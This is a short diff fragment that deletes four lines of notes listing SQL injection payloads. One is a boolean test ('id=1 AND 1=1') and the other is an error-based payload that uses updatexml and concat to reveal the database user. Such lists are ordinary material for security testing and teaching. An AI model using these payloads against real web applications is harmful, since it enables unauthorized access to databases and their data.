@@ -1,4 +1,0 @@
-Payload:
-(1)id=1 AND 1=1
-(2)报错Payload
-and updatexml(1,concat(0x7e,user()),1)
